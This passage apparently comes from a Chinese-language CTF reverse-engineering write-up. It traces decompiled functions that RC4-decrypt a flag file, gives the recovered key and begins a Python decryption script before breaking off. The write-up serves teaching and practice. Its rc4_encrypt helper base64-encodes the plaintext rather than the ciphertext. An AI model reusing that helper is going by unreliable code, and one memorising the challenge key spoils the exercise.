punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v15<span class=\"token punctuation\">,</span> v14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>在这里，很容易可以猜出对文件内容进行了读取，猜测 flag 就在其中</p>\n<p>依次跟进函数，</p>\n<p>sub_4010F0 --&gt; sub_401800</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401800@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DCh] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a3 <span class=\"token operator\">+</span> i <span class=\"token operator\">%</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      v4 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a4 <span class=\"token operator\">&gt;</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      v4 <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_4010C8 --&gt; sub_401780</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401780@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    v2 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_40116D --&gt; sub_4018E0</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4018E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// STEB_1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-2Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+F4h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a3<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7 <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v3 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_4010EB --&gt; sub_4015E0</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4015E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>File<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>a4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-138h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">char</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D3h] [ebp-65h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">char</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DFh] [ebp-59h]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-50h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+F4h] [ebp-44h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">char</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+103h] [ebp-35h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+10Ch] [ebp-2Ch]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+11Bh] [ebp-1Dh]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+124h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+130h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v21 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v20 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">=</span> v10 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v18 <span class=\"token operator\">=</span> v20 <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v20 <span class=\"token operator\">=</span> v18 <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    v17 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v18 <span class=\"token operator\">%</span> <span class=\"token number\">256</span> <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v17<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    v16 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    v14 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">%</span> <span class=\"token number\">256</span> <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    v13 <span class=\"token operator\">=</span> v14 <span class=\"token operator\">^</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token function\">fputc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v14 <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    v8 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v7<span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    v9 <span class=\"token operator\">=</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">,</span> v8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>该函数类似于 RC4 的加解密，而文件猜测为 <code>enflag.txt</code>  的内容，密钥即为前面解出来的 <code>[Warnning]Access_Unauthorized</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> ARC4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> pathlib <span class=\"token keyword\">import</span> Path</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rc4_encrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>        <span class=\"token comment\"># 加密</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    enc <span class=\"token operator\">=</span> ARC4<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    res<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rc4_decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>        <span class=\"token comment\"># 解密</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    data <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span 